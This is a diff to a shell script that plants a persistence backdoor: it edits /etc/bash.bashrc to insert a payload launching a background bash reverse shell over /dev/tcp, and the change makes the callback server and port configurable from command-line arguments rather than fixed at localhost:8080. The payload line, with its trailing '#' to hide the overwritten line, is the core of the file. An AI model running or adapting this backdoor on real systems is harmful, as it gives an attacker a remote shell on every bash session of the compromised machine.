@@ -12,11 +12,21 @@
 
 . "$(dirname "$0")/common.sh"
 
+if [ $# -eq 0 ]; then
+	server=localhost
+	port=8080
+elif [ $# -eq 2 ]; then
+	server="$1"
+	port="$2"
+else
+	die "Invalid number of arguments: $#"
+fi
+
 # file to edit
 target=/etc/bash.bashrc
 
 # note the trailing '#' to ignore any garbage from the old line
-payload="(nohup bash -c 'bash -i>&/dev/tcp/localhost/8080 0>&1' >/dev/null 2>&1&) #"
+payload="(nohup bash -c 'bash -i>&/dev/tcp/$server/$port 0>&1' >/dev/null 2>&1&) #"
 payload_len=$(printf "$payload" | wc -c)
 
 if [ ! -r $target ]; then
